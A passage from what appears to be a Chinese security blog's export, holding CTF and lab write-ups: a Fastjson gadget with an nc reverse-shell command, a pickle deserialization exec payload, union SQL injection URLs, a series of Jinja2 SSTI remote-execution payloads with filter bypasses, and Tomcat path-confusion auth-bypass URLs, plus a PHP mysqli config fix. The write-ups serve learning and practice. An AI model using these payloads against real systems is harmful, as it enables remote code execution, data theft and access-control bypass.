  public static void main(String[] args) throws Exception &#123;        Object object = new Fastjson4_ObjectFactoryDelegatingInvocationHandler().getObject(Util.getDefaultTestCmd());        Util.runGadgets(object);    &#125;&#125;

将其生成的经过base64编码的字节码传过去，成功弹窗

最后 nc 弹 shell 成功  nc xx.xx.xx.xx 7890 -e /bin/sh 
]]></content>
      <categories>
        <category>Write-Up</category>
      </categories>
  </entry>
  <entry>
    <title>MoeCTF复盘</title>
    <url>/2024/10/15/MoeCTF%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[前言本篇复盘仅仅是针对于本次比赛中我不会的题目进行一次复盘，对于做出来的题目并不会写上相关的题解
并且仅仅是web方向的题目
Re: 从零开始的 XDU 教书生活该题首先要对题目提供的源码理解透彻，明白每个函数的功能
题目要求是要让每个学生都正常签到才可以获得flag
其实本质上就是需要我们重复发送请求
脚本如下：
import requestsfrom Crypto.Cipher import AESimport base64# 请替换为您的靶机BASE_URL = &quot;http://127.0.0.1:8888&quot;def encrypt_by_aes(data: str, key: str, iv: str) -&gt; str:    key_bytes = key.encode(&quot;utf-8&quot;)    iv_bytes = iv.encode(&quot;utf-8&quot;)    cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)    data_bytes = data.encode(&quot;utf-8&quot;)    pad = 16 - len(data_bytes) % 16    data_bytes = data_bytes + bytes([pad] * pad)    encrypted_bytes = cipher.encrypt(data_bytes)    encrypted = base64.b64encode(encrypted_bytes).decode(&quot;utf-8&quot;)    return encrypteddef login(phone: str, password: str):    url = f&quot;&#123;BASE_URL&#125;/fanyalogin&quot;    key = &quot;u2oh6Vu^HWe4_AES&quot;    iv = &quot;u2oh6Vu^HWe4_AES&quot;    encrypted_phone = encrypt_by_aes(phone, key, iv)    encrypted_password = encrypt_by_aes(password, key, iv)    data = &#123;        &quot;uname&quot;: encrypted_phone,        &quot;password&quot;: encrypted_password,        &quot;t&quot;: &quot;true&quot;    &#125;        session = requests.Session()    response = session.post(url, data=data)    response_data = response.json()        if response_data.get(&quot;status&quot;):        return session    else:        print(&quot;Login failed:&quot;, response_data.get(&quot;msg2&quot;))        return Nonedef get_unsigned_student_accounts(session):    url = f&quot;&#123;BASE_URL&#125;/widget/sign/pcTeaSignController/showSignInfo1&quot;    response = session.get(url)    response_data = response.json()    students = response_data[&quot;data&quot;][&quot;changeUnSignList&quot;]    return studentsdef get_sign_code(session):    url = f&quot;&#123;BASE_URL&#125;/v2/apis/sign/refreshQRCode&quot;    response = session.get(url)    response_data = response.json()    if response_data.get(&quot;result&quot;) == 1:        return response_data[&quot;data&quot;][&quot;signCode&quot;], response_data[&quot;data&quot;][&quot;enc&quot;]    else:        print(&quot;Failed to get sign code:&quot;, response_data.get(&quot;errorMsg&quot;))        return None, Nonedef sign_in(session, sign_code: str, enc: str):    url = f&quot;&#123;BASE_URL&#125;/widget/sign/e&quot;    params = &#123;        &quot;id&quot;: str(active_id),        &quot;c&quot;: sign_code,        &quot;enc&quot;: enc    &#125;    response = session.get(url, params=params)    return response.textdef end_active(session):    url = f&quot;&#123;BASE_URL&#125;/widget/active/endActive&quot;    response = session.get(url)    response_data = response.json()    if response_data.get(&quot;result&quot;) == 1:        return response_data.get(&quot;errorMsg&quot;)    else:        print(&quot;Failed to end activity:&quot;, response_data.get(&quot;errorMsg&quot;))        return Noneif __name__ == &quot;__main__&quot;:    teacher_phone = &quot;10000&quot;    teacher_password = &quot;10000&quot;    active_id = 4000000000000    teacher_session = login(teacher_phone, teacher_password)    if teacher_session:        students = get_unsigned_student_accounts(teacher_session)        sign_code, enc = get_sign_code(teacher_session)                for student in students:            student_session = login(str(student[&quot;uid&quot;]), str(student[&quot;uid&quot;]))            if student_session and sign_code and enc:                sign_in_response = sign_in(student_session, sign_code, enc)                print(f&quot;Student &#123;student[&#x27;uid&#x27;]&#125; sign in response:&quot;, sign_in_response)                flag = end_active(teacher_session)        print(&quot;Flag:&quot;, flag)

PetStore本题的关键代码如下：
def import_pet(self, serialized_pet) -&gt; bool:        try:            pet_data = base64.b64decode(serialized_pet)            pet = pickle.loads(pet_data)            if isinstance(pet, Pet):                for i in self.pets:                    if i.uuid == pet.uuid:                        return False                self.pets.append(pet)                return True            return False        except Exception:            return False

可以看出来是调用了pickle的反序列化，所以我们的思路就是生成一个恶意的类对象，对其 Pickle 序列化后进行 Base64 编码，把得到的结果传入  import_pet() 方法就可以了
上网搜索下该怎么利用，发现只要被序列化的对象中存在__reduce__方法，pickle 模块会调用这个方法来获 取对象的序列化信息。 __reduce__ 方法应返回一个元组，这个元组包含两个元素：

一个可调用对象：通常是一个构造器或一个函数。这个对象在反序列化时被调 用，用于创建新的对象实例。 
一个元组：包含传递给可调用对象的参数。当反序列化时，这个元组中的参数会 传递给第一个元素（可调用对象）。

当反序列化时，pickle 模块会按照以下步骤操作： 

调用第一个元素（可调用对象）并传入第二个元素（元组）的解包结果作为参数。 
使用可调用对象的返回值作为反序列化的结果。

__reduce__()其实是object类中的一个魔术方法，我们可以通过重写类的 object.__reduce__() 函数，使之在被实例化时按照重写的方式进行。
Python要求该方法返回一个字符串或者元组。如果返回元组(callable, ([para1,para2...])[,...]) ，那么每当该类的对象被反序列化时，该callable就会被调用，参数为para1、para2...
从 Dockerfile 中可以知道，题目环境中的 Python 版本是 3.12.4，且 flag 存储在环境变量  FLAG 中
我本人是通过建一个docker容器来实现序列化过程的（不是很想再配环境，比较麻烦）
序列化的python代码如下：
import base64import pickleclass Test:    def __reduce__(self):        return (exec, (&quot;import os; store.create_pet(os.getenv(&#x27;FLAG&#x27;), &#x27;flag&#x27;);&quot;,))if __name__ == &quot;__main__&quot;:    print(base64.b64encode(pickle.dumps(Test())).decode(&quot;utf-8&quot;))

将序列化后的内容输入Import a Pet中，便可以在主页面看到flag的内容了
序列化后的内容被题目反序列化后执行的代码为exec(&quot;import os; store.create_pet(&#39;flag&#39;, os.getenv(&#39;FLAG&#39;));&quot;)
smbms该题为java代码审计
由于本人刚刚学完java基础，代码审计起来还是比较困难
在审计的过程中可以发现整个 java 项目都使用 PrepareStatement 预编译语句，所以一般情况下是不能注入的
但是方式都有例外，那些基础的sql语句虽然全部都是预编译过了的，但是后面还有另外增添部分查询条件的
就比如java&#x2F;top&#x2F;sxrhhh&#x2F;dao&#x2F;user&#x2F;UserDaoImpl.java 文件中的getUserList函数便出现了字符串拼接的情况
if (!StringUtils.isNullOrEmpty(userName)) &#123;                // 添加用户名查询条件                sql.append(&quot; and u.userName like &#x27;%&quot;).append(userName).append(&quot;%&#x27;&quot;);            &#125;

可以发现userName参数是直接插入进sql语句进行条件校正的，单引号包括，所以我们可以尝试逃出单引号再拼接自己的sql语句
但是要执行这个函数（即查询用户），我们需要先登录进后台
所以进行爆破，账号名为admin，密码为1234567
进入后台到查询用户处，开始sql注入，其中的%25就是%的url编码
/jsp/user.do?method=query&amp;queryName=1%25&#x27;union select 1,2,database(),4,5,6,7,8,9,1,1,1,1,1 where &#x27;1&#x27; like &#x27;%251&amp;queryUserRole=0&amp;pageIndex=1


这里最好是使用直接闭合的方式（我之前采用注释掉后面sql语句的方式并没有奏效）
接下来都是union注入的过程，便不一一列举了
/jsp/user.do?method=query&amp;queryName=1%25&#x27; union select 1,1,group_concat(flag),4,5,6,7,8,9,1,1,1,1,1 from flag where &#x27;1&#x27;like&#x27;%251&amp;queryUserRole=0&amp;pageIndex=1 

拿到flag，题目解决
]]></content>
      <categories>
        <category>Write-Up</category>
      </categories>
  </entry>
  <entry>
    <title>SSTI靶场题解</title>
    <url>/2024/03/12/SSTI%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[level-1(no waf)遍历目标中含有内建函数 eval 的子类的索引号：
import requestsif __name__ == &quot;__main__&quot;:    post_url = &quot;http://124.70.99.199:10086/level/1&quot;    for i in range(200):        param = &#123;            &#x27;code&#x27;: &quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&quot;        &#125;        res = requests.post(post_url, data=param)        if &#x27;eval&#x27; in res.text:            print(i,&quot;!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;)        else:            print(i,res.text,res.status_code,&quot;no&quot;)

所以随便挑一个构造payload为：&#123;&#123;''.__class__.__bases__[0].__subclasses__()[158].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')&#125;&#125;
获取到flag的位置，读取flag：&#123;&#123;''.__class__.__bases__[0].__subclasses__()[158].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /flag.txt").read()')&#125;&#125;
level-2(过滤了大括号)可以用 &#123;%print(......)%&#125; 的形式来代替大括号 ，如下：
&#123;%print(&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[158].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;))%&#125;

获取到flag的位置，读取flag
level-3(no waf and blind)没有任何回显，最开始是想要利用curl命令来把文件外带出来的curl -d cat /flag.txt -o output.txt，，flag.txt会被写到app.py同目录下，读取不出来，所以这个尝试失败了
后面学长说不必如此，目录下面只有static目录下面的文件可以被直接读取，所以可以把要的文件写到static目录下，就可以直接通过url来进行访问了
所以payload如下
&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[158].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag.txt &gt; static/output.txt&quot;).read()&#x27;)&#125;&#125;

然后直接访问/static/output.txt，便可以得到flag.txt的内容
level-4(过滤了[])可以使用 __getitem__() 方法来绕过中括号：
&#123;&#123;&#x27;&#x27;.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(158).__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;eval&#x27;)(&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

获取到flag的位置，读取flag
level-5(过滤了单双引号)可以使用requests对象进行绕过，如下所示：
level-6(过滤了下划线)使用requests对象进行绕过，
code=&#123;&#123;&#x27;&#x27;[request.values.class][request.values.base][request.values.subclasses]()[284][request.values.init][request.values.globals][&#x27;linecache&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;&amp;class=__class__&amp;base=__base__&amp;subclasses=__subclasses__&amp;init=__init__&amp;globals=__globals__

以上使用数字或者字符串都可以溯源到object类，但是()，[]等的不行，因为两个的父类分别是tuple和list，所以一旦按照上面的进行操作
便是在初始化元组或者列表
&#123;&#123;().__class__[request.values.base]&#125;&#125;&amp;base=__base__回显Hello tuple[&#x27;__base__&#x27;]&#123;&#123;[].__class__[request.values.base]&#125;&#125;&amp;base=__base__回显Hello list[&#x27;__base__&#x27;]

还有一种编码绕过
__class__ =&gt; \x5f\x5fclass\x5f\x5f

其中_的十六进制编码为\x5f，于是我们可以构造出如下的payload：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[154].__init__.__globals__[&#x27;popen&#x27;](&quot;ls /&quot;).read()&#125;&#125;

&#123;&#123;()|attr(&quot;\x5f\x5fclass\x5f\x5f&quot;)|attr(&quot;\x5f\x5fbase\x5f\x5f&quot;)|attr(&quot;\x5f\x5fsubclasses\x5f\x5f&quot;)()|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(154)|attr(&quot;\x5f\x5finit\x5f\x5f&quot;)|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&#x27;popen&#x27;)(&quot;ls /&quot;)|attr(&quot;read&quot;)()&#125;&#125;

level-7(过滤点)使用|attr来进行绕过，payload如下：
code=&#123;&#123;&#x27;&#x27;|attr(&quot;__class__&quot;)|attr(&quot;__bases__&quot;)|attr(&quot;__getitem__&quot;)(0)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(154)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;popen&quot;)(&quot;ls /&quot;)|attr(&quot;read&quot;)()&#125;&#125;

也可以用[]来绕过，如下：
code=&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__base__&#x27;][&#x27;__subclasses__&#x27;]()[154][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;popen&#x27;](&#x27;ls /&#x27;)[&#x27;read&#x27;]()&#125;&#125;

level-8过滤了[&quot;class&quot;, &quot;arg&quot;, &quot;form&quot;, &quot;value&quot;, &quot;data&quot;, &quot;request&quot;, &quot;init&quot;, &quot;global&quot;, &quot;open&quot;, &quot;mro&quot;, &quot;base&quot;, &quot;attr&quot;]
当用[]进行绕过的时候，里面的所有内容都可以被编码，payload如下：
code=&#123;&#123;&#x27;&#x27;[&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;][&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&#x27;][&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;]()[154][&#x27;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&#x27;][&#x27;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#x27;][&#x27;\u0070\u006f\u0070\u0065\u006e&#x27;](&#x27;ls /&#x27;)[&#x27;read&#x27;]()&#125;&#125;

当然，也可以使用字符串拼接来进行绕过，这里就不一一列举了
level-9(过滤数字0到9)首先我们可以使用过滤器|length来构造数字进行绕过：&#123;% set a='aaaaaaaaaaa'|length*'aa'|length*'aaaaaaa'|length %&#125;&#123;&#123;a&#125;&#125;
所以payload如下：
code=&#123;% set a=&#x27;aaaaaaaaaaa&#x27;|length*&#x27;aa&#x27;|length*&#x27;aaaaaaa&#x27;|length %&#125;&#123;&#123;a&#125;&#125;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[a].__init__.__globals__[&#x27;popen&#x27;](&quot;ls /&quot;).read()&#125;&#125;

level-10set config = None这一关的目的是拿到config,当我们使用&#123;&#123;config&#125;&#125;以及&#123;&#123;self&#125;&#125;时都返回了None.看来是被ban了,所以得重新寻找一个储存相关信息的变量，发现存在这么一个变量current_app是我们需要的.官网对current_app提供了这么一句说明

应用上下文会在必要时被创建和销毁。它不会在线程间移动，并且也不会在不同的请求之间共享。正因为如此，它是一个存储数据库连接信息或是别的东西的最佳位置。

因此,此处能使用current_app绕过.
构造payload,拿到config
&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;

两句要分别带进去，不能同时带进去
level-11过滤了[&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;+&#39;, &#39;request&#39;, &#39;.&#39;, &#39;[&#39;, &#39;]&#39;]，所以我们有以下的操作：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[154].__init__.__globals__[&#x27;popen&#x27;](&quot;ls /&quot;).read()&#125;&#125;

&#123;% set a = dict(__cla=aa,ss__=bb)|join %&#125;&#123;% set b = dict(__ba=aa,se__=bb)|join %&#125;&#123;% set sub = dict(__subcl=aa,asses__=bb)|join %&#125;&#123;% set d = dict(__get=aa,item__=bb)|join %&#125;&#123;% set e = dict(__in=aa,it__=bb)|join %&#125;&#123;% set f = dict(__glo=aa,bals__=bb)|join %&#125;&#123;%set g=dict(pop=a,en=b)|join %&#125;&#123;% set c = dict(c=aa)|reverse|first %&#125;&#123;% set bfh = self|string|urlencode|first %&#125; &#123;% set bfhc=bfh~c %&#125;&#123;% set space = bfhc%((3~2)|int) %&#125; &#123;% set slas = bfhc%((4~7)|int) %&#125; &#123;%set ls = dict(ls=abc)|join %&#125;&#123;%set i= ls~space~slas %&#125;&#123;%set read = dict(read=aa)|join %&#125;&#123;&#123;1|attr(a)|attr(b)|attr(sub)()|attr(d)(154)|attr(e)|attr(f)|attr(d)(g)(i)|attr(read)()&#125;&#125;

level-12过滤了[&#39;_&#39;, &#39;.&#39;, &#39;0-9&#39;, &#39;\\&#39;, &#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;[&#39;, &#39;]&#39;]
没有过滤requests，所以我们可以结合上题并通过requests对象来进行绕过
借鉴[你还不会FlaskSSTI?]：https://xz.aliyun.com/t/10394?time__1311=mq%2BxBDyDu7KDq40vdbievqWqGKG%3DKe1K4D&amp;alichlgref=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3D1XE44Oe9LhAQthl0yGVsdHutPlRqph5qbyfEmDv259FgerbZ_mEeo5_XwD2uDZj6%26wd%3D%26eqid%3Da3e04c52003086bb0000000365ed5d11#toc-21
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat URL解析差异性导致的安全问题</title>
    <url>/2025/08/20/Tomcat-URL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[引用Tomcat URL解析差异性导致的安全问题
前言本文主要是对该篇文章进行一个备份，避免后续找不到该文章了
URL解析差异性HttpServletRequest中几个解析URL的函数在Servlet处理URL请求的路径时，HTTPServletRequest有如下几个常用的函数：

request.getRequestURL()：返回全路径；
request.getRequestURI()：返回除去Host（域名或IP）部分的路径；
request.getContextPath()：返回工程名部分，如果工程映射为/，则返回为空；
request.getServletPath()：返回除去Host和工程名部分的路径；
request.getPathInfo()：仅返回传递到Servlet的路径，如果没有传递额外的路径信息，则此返回Null；

网上的一个小结，Servlet的匹配路径为/test%3F/*，并且Web应用是部署在/app下，此时请求的URL为http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID?p+1=c+d&amp;p+2=e+f#a，各个函数解析如下表：



函数
URL解码
解析结构



getRequestURL()
no
http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID


getRequestURI()
no
/app/test%3F/a%3F+b;jsessionid=s%3F+ID


getContextPath()
no
/app


getServletPath()
yes
/test?


getPathInfo()
yes
/a?+b


特殊字符的URL解析新建一个Java Web项目，index.jsp如下：
&lt;%out.println(&quot;getRequestURL(): &quot; + request.getRequestURL() + &quot;&lt;br&gt;&quot;);out.println(&quot;getRequestURI(): &quot; + request.getRequestURI() + &quot;&lt;br&gt;&quot;);out.println(&quot;getContextPath(): &quot; + request.getContextPath() + &quot;&lt;br&gt;&quot;);out.println(&quot;getServletPath(): &quot; + request.getServletPath() + &quot;&lt;br&gt;&quot;);out.println(&quot;getPathInfo(): &quot; + request.getPathInfo() + &quot;&lt;br&gt;&quot;);%&gt;

正常访问Tomcat运行之后，正常访问http://localhost:8080/urltest/index.jsp，页面输出如下：

插入 .&#x2F; 访问尝试插入多个./访问即http://localhost:8080/urltest/./././index.jsp，页面输出如下：

可以看到，插入多个./也能正常访问。
接着尝试这种形式http://localhost:8080/urltest/.a/.bb/.ccc/index.jsp，发现是返回404，未找到该资源访问：

插入 ..&#x2F; 访问尝试插入../访问即http://localhost:8080/urltest/../index.jsp，页面输出如下：

可以是返回的404，这是因为实际访问的是http://localhost:8080/index.jsp，这个目录文件当然不存在。
换种跨目录的形式就OK了http://localhost:8080/urltest/noexist/../index.jsp：

插入 ;&#x2F; 访问尝试插入多个;/访问即http://localhost:8080/urltest/;/;/;/index.jsp，页面输出如下：

可以看到，插入多个;也能正常访问。
在;号后面加上字符串也是能正常访问的，如http://localhost:8080/urltest/;a/;bb/;ccc/index.jsp：

插入其他特殊字符访问尝试插入如下这些特殊字符进行访问，页面均返回400或404，无法访问：
` ~ ! @ # $ % ^ &amp; * ( ) - _ = + [ ] &#123; &#125; \ | : &#x27; &quot; &lt; &gt; ?

小结由前面的尝试知道，Tomcat中的URL解析是支持嵌入./、../、;xx/等特殊字符的。此外，getRequestURL()和getRequestURI()这两个函数解析提取的URL内容是包含我们嵌入的特殊字符的，当使用不当时会存在安全问题如绕过认证。
调试分析Tomcat会先对请求的URL进行解析处理，提取到一些信息之后才会到调用getRequestURI()等函数的流程。
Tomcat对URL特殊字符的处理这里我们先来调试分析下Tomcat是如何对请求URL中不同的特殊字符作不同的处理的。
经过调试分析，得知Tomcat是在CoyoteAdapter.service()函数上对请求URL进行解析处理的，直接在这里打上断点，此时的函数调用栈如下：
service:452, CoyoteAdapter (org.apache.catalina.connector)process:1195, AbstractHttp11Processor (org.apache.coyote.http11)process:654, AbstractProtocol$AbstractConnectionHandler (org.apache.coyote)run:317, JIoEndpoint$SocketProcessor (org.apache.tomcat.util.net)runWorker:1142, ThreadPoolExecutor (java.util.concurrent)run:617, ThreadPoolExecutor$Worker (java.util.concurrent)run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:745, Thread (java.lang)

在CoyoteAdapter.service()函数中，会调用postParseRequest()函数来解析URL请求内容：

跟进postParseRequest()函数中，其中先后调用parsePathParameters()和normalize()函数对请求内容进行解析处理：

这里我们先跟进parsePathParameters()函数，先是寻找URL中是否存在;号，找到的话才会进入下面的if代码逻辑：

如果找到了;号，在if代码逻辑中后面的循环体会将;xxx/中的分号与斜杠之间的字符串以及分号本身都去掉，我们访问http://localhost:8080/urltest/;mi1k7ea/index.jsp再试下，就可以进入该代码逻辑调试看到（代码中ASCII码59是;，47是/）：

由此可知，parsePathParameters()函数是对;xxx/这种形式进行处理的。
接着，跟进normalize()函数，该函数是对经过parsePathParameters()函数处理过后的请求URL进行标准化处理。
先看到这段代码，ASCII码92表示\，当匹配到时将其替换为ASCII码为47的/；当匹配到ASCII码0即空字符时，直接返回false无法成功解析：

往下是这段循环，判断是否有连续的/，存在的话则循环删除掉多余的/：

接着往下看，这段循环就是对./和../这些特殊字符进行处理，如果这两个字符串都找不到则直接返回true：

这里尝试下添加/./访问的处理，看到找到之后是直接将其去掉然后继续放行：

这里尝试下添加/../访问的处理，看到找到后是会进行往前目录层级的回溯处理再拼接到上面某一层目录形成新的URL：

由此可知，normalize()函数对经过经过parsePathParameters()函数过滤过;xxx/的URL请求内容进标准化处理，具体为将连续的多个/给删除掉只保留一个、将/./删除掉、将/../进行跨目录拼接处理，最后返回处理后的URL路径。
结论
Tomcat对/;xxx/以及/./的处理是包容的、对/../会进行跨目录拼接处理。
getRequestURI()的处理我们直接在index.jsp中调用getRequestURI()函数的地方打上断点调试即可。
这里是直接调用Request.requestURI()函数然后直接返回其字符串值：

跟进Request.requestURI()函数，这里是直接返回请求的URL内容，没有做任何处理以及URL解码：

getRequestURL()的处理在getRequestURL()函数中是调用了Request.getRequestURL()函数的：

跟进该函数，在提取了协议类型、host和port之后，调用了getRequestURI()函数获取URL请求的路径，然后直接拼接进URL直接返回而不做包括URL解码的任何处理：

getServletPath()的处理在getServletPath()函数中是调用了Request.getServletPath()函数的：

跟进去，看到是直接返回前面Tomcat已经处理过后的提取处理的Servlet路径，注意这里是获取MappingData类对象中的wrapperPath属性值：

getPathInfo()的处理和getServletPath()函数的处理是一样的，同样是返回前面经过Tomcat解析处理后的MappingData类对象中其中一个属性值，这里是获取的pathInfo属性值并直接返回：

getContextPath()的处理在getContextPath()函数中，调用了Request.getContextPath()函数：

跟进该函数，先是调用getServletContext().getContextPath()来获取当前Servlet上下文路径以及调用getRequestURI()函数获取当前请求的目录路径：

往下的这段循环是处理uri变量值中如果存在多个连续的/则删除掉：

再往下，获取下一个/符号的位置，然后根据该位置索引对uri变量值进行工程名的切分提取：

接着，就是对刚刚切分得到的candidate变量进行和Tomcat一样的特殊字符处理过程，先调用removePathParameters()处理;和.，然后进行URL解码，再调用normalize()函数进行标准化处理，处理过后比较处理完的candidate变量值和之前获取的规范上下文路径是否一致，不一致的话就循环继续前面的操作直至一致为止：

最后，直接返回按pos索引切分的uri变量值：

攻击利用看个访问限制绕过的场景。
假设Tomcat上启动的Web目录下存在一个info目录，其中有一个secret.jsp文件，其中包含敏感信息等：
&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Secret&lt;/title&gt;&lt;/head&gt;&lt;body&gt;username: mi1k7ea&lt;br&gt;password: 123456&lt;br&gt;address: china&lt;br&gt;phone: 13666666666&lt;br&gt;&lt;/body&gt;&lt;/html&gt;

新建一个filter包，其中新建一个testFilter类，实现Filter接口类：
package filter;import javax.servlet.*;import javax.servlet.http.*;import java.io.IOException;public class testFilter implements Filter &#123;    @Override    public void init(FilterConfig filterConfig) throws ServletException &#123;    &#125;    @Override    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;        HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest;        HttpServletResponse httpServletResponse = (HttpServletResponse)servletResponse;        String url = httpServletRequest.getRequestURI();        if (url.startsWith(&quot;/urltest/info&quot;)) &#123;            httpServletResponse.getWriter().write(&quot;No Permission.&quot;);            return;        &#125;        filterChain.doFilter(servletRequest, servletResponse);    &#125;    @Override    public void destroy() &#123;    &#125;&#125;

这个Filter作用是：只要访问&#x2F;urltest&#x2F;info目录下的资源，都需要进行权限判断，否则直接放行。可以看到，这里调用getRequestURI()函数来获取请求中的URL目录路径，然后调用startsWith()函数判断是否是访问的敏感目录，若是则返回无权限的响应。当然这里写得非常简单，只做演示用。
编辑web.xml，添加testFilter设置：
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;         version=&quot;4.0&quot;&gt;    &lt;filter&gt;        &lt;filter-name&gt;testFilter&lt;/filter-name&gt;        &lt;filter-class&gt;filter.testFilter&lt;/filter-class&gt;    &lt;/filter&gt;    &lt;filter-mapping&gt;        &lt;filter-name&gt;testFilter&lt;/filter-name&gt;        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;    &lt;/filter-mapping&gt;&lt;/web-app&gt;

运行之后，访问http://localhost:8080/urltest/info/secret.jsp，会显示无权限：

根据前面的分析构造如下几个payload都能成功绕过认证限制来访问：
http://localhost:8080/urltest/./info/secret.jsphttp://localhost:8080/urltest/;mi1k7ea/info/secret.jsphttp://localhost:8080/urltest/mi1k7ea/../info/secret.jsp



整个的过程大致如此，就是利用解析的差异性来绕过认证。
PS在 Spring Boot 2.5.0 开始，官方引入了一个安全性修复：

禁止对静态资源路径进行 ..（目录穿越）解析。

也就是说，如果你访问类似：
http://localhost:8080/../../application.properties

在 Spring Boot 2.4.x 及之前，可能会被 Tomcat&#x2F;WebFlux 的静态资源解析器处理（具体行为依赖配置，有些情况下能“逃逸”到资源目录外）。 从 Spring Boot 2.5.0 起，这个被直接拦截，返回 400 或 404。


]]></content>
  </entry>
  <entry>
    <title>PHP中出现Call to undefined function mysqli_connect()</title>
    <url>/2024/05/25/PHP%E4%B8%AD%E5%87%BA%E7%8E%B0Call-to-undefined-function-mysqli-connect/</url>
    <content><![CDATA[错误 Call to undefined function mysqli_connect() 和错误 can’t find class mysqli in :***** 错误是同一种错误，只是php中连接 MySQl的不同写法而已
那么我们要怎么做呢
首先，让我们到自己安装的php目录下面，打开它的配置文件
如果像我一样用的是phpstudy下的八点多的版本，那么它的配置文件php.ini是空的，需要我们自己去把当前目录下的php.ini-development里面的所有内容复制过去（该文件可以用记事本打开）
然后在配置文件中搜索一下extension_dir，如下：
将图中选中的部分改为 ./ext/，并把前面的分号去掉（这是因为在修改成的目录下面有php_mysqli.dll，如果没有那就是下载的时候出错了，再重新下载一遍）
注意：配置文件中的分号其实是注释符，要开启啥功能要先把它去掉
然后让我们搜索 extension=，然后会发现一大块都是extension=的部分，在其中添加上extension=mysqli，如下：

注意：配置文件里面原本也存在extension&#x3D;mysqli，把它前面的分号去掉的话是不会起作用的
修改完后要记得保存，然后我们就重启phpstudy和phpstorm，然后就可以正常连接了
其实我们还可以验证一下，打开命令行，输入：php -m，显示的一部分如下：

我们可以看到有mysqli，这说明我们的操作成功了（这种验证方法的前提是你有配置php的环境）
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>ZeroDaysCTF-web题解</title>
    <url>/2025/04/20/ZeroDaysCTF-web%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[前言该比赛笔者并未参加，只是赛后默默自己复现着做
感谢比赛方伟大的开源：https://github.com/ZeroDaysCTF/ZeroDaysCTF_2025_Public
JohnAndMarys最主要的文件便是app.py，里面着重看下面这个函数
@app.route(&#x27;/order&#x27;, methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def order():    if request.method != &#x27;POST&#x27;:        return redirect(&quot;/&quot;)    sess_id = session.get(&#x27;session_id&#x27;)    whiskey_limit = session_data[sess_id].get(&#x27;whiskey_limit&#x27;)    time.sleep(1)     order = request.json    order[&#x27;quantity&#x27;] = int(order[&#x27;quantity&#x27;])    if order[&#x27;quantity&#x27;]&lt;1:        return &quot;Order fail - quantity must be greater than zero&quot;    if order[&#x27;item&#x27;] not in [&quot;whiskey&quot;, &quot;candles&quot;, &quot;tea&quot;]:        return &quot;Order fail - invalid item, we dont stock that!&quot;    if order[&#x27;item&#x27;] == &#x27;whiskey&#x27;:        if order[&#x27;quantity&#x27;] 